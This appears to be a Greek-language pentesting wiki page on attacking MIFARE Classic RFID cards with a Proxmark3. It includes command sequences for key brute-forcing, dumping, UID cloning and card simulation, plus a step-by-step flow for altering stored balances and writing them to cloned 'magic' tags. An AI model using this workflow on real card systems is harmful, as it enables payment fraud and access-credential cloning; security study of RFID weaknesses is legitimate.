# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Επίθεση σε RFID Systems με Proxmark3

Το πρώτο πράγμα που πρέπει να κάνετε είναι να έχετε ένα [**Proxmark3**](https://proxmark.com) και να [**εγκαταστήσετε το software και τα dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Επίθεση σε MIFARE Classic 1KB

Διαθέτει **16 sectors**, καθένας από τους οποίους έχει **4 blocks**, ενώ κάθε block περιέχει **16B**. Το UID βρίσκεται στο sector 0, block 0 (και δεν μπορεί να τροποποιηθεί).\
Για να αποκτήσετε πρόσβαση σε κάθε sector χρειάζεστε **2 keys** (**A** και **B**), οι οποίες αποθηκεύονται στο **block 3 κάθε sector** (sector trailer). Το sector trailer αποθηκεύει επίσης τα **access bits**, τα οποία παρέχουν δικαιώματα **read και write** σε **κάθε block**, χρησιμοποιώντας τα 2 keys.\
Τα 2 keys είναι χρήσιμα για την παροχή δικαιωμάτων read όταν γνωρίζετε το πρώτο και write όταν γνωρίζετε το δεύτερο (για παράδειγμα).

Μπορούν να εκτελεστούν διάφορες επιθέσεις<sup>[[1]](#references)</sup>.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Το Proxmark3 επιτρέπει την εκτέλεση και άλλων ενεργειών, όπως το **eavesdropping** μιας **Tag to Reader communication**, για την προσπάθεια εντοπισμού ευαίσθητων δεδομένων. Σε αυτή την κάρτα μπορείτε απλώς να κάνετε sniffing της επικοινωνίας και να υπολογίσετε το χρησιμοποιούμενο key, επειδή οι **cryptographic operations used are weak** και, γνωρίζοντας το plain και το cipher text, μπορείτε να το υπολογίσετε (εργαλείο `mfkey64`).<sup>[[3]](#references)</sup>

#### MiFare Classic: γρήγορη ροή εργασίας για κατάχρηση αποθηκευμένης αξίας

Όταν τα terminals αποθηκεύουν υπόλοιπα σε Classic cards, μια τυπική end-to-end flow είναι:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Σημειώσεις

- `hf mf autopwn` ενορχηστρώνει επιθέσεις τύπου nested/darkside/HardNested, ανακτά keys και δημιουργεί dumps στον φάκελο dumps του client.
- Η εγγραφή του block 0/UID λειτουργεί μόνο σε magic gen1a/gen2 cards. Οι κανονικές Classic cards έχουν UID μόνο για ανάγνωση.<sup>[[2]](#references)</sup>
- Πολλές εγκαταστάσεις χρησιμοποιούν Classic "value blocks" ή απλά checksums. Βεβαιωθείτε ότι όλα τα διπλότυπα/complemented πεδία και τα checksums παραμένουν συνεπή μετά την επεξεργασία.

Δείτε μια μεθοδολογία υψηλότερου επιπέδου και mitigations στο:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

Τα IoT systems μερικές φορές χρησιμοποιούν **μη επώνυμα ή μη εμπορικά tags**. Σε αυτήν την περίπτωση, μπορείτε να χρησιμοποιήσετε το Proxmark3 για να στείλετε **custom raw commands στα tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Με αυτές τις πληροφορίες, θα μπορούσες να αναζητήσεις πληροφορίες σχετικά με την κάρτα και τον τρόπο επικοινωνίας μαζί της. Το Proxmark3 επιτρέπει την αποστολή raw commands, όπως: `hf 14a raw -p -b 7 26`

### Scripts

Το λογισμικό Proxmark3 διαθέτει μια προφορτωμένη λίστα από **scripts αυτοματοποίησης**, τα οποία μπορείς να χρησιμοποιήσεις για την εκτέλεση απλών εργασιών. Για να ανακτήσεις την πλήρη λίστα, χρησιμοποίησε την εντολή `script list`. Στη συνέχεια, χρησιμοποίησε την εντολή `script run`, ακολουθούμενη από το όνομα του script:
```
proxmark3> script run mfkeys
```
Μπορείτε να δημιουργήσετε ένα script για **fuzz tag readers**: έτσι, αφού αντιγράψετε τα δεδομένα μιας **έγκυρης κάρτας**, γράψτε απλώς ένα **Lua script** που **τυχαιοποιεί** ένα ή περισσότερα τυχαία **bytes** και ελέγξτε αν ο **reader καταρρέει** σε κάποια επανάληψη.

## Αναφορές

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Δήλωση της NXP σχετικά με το MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Εκμετάλλευση ευπάθειας κάρτας NFC στο KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
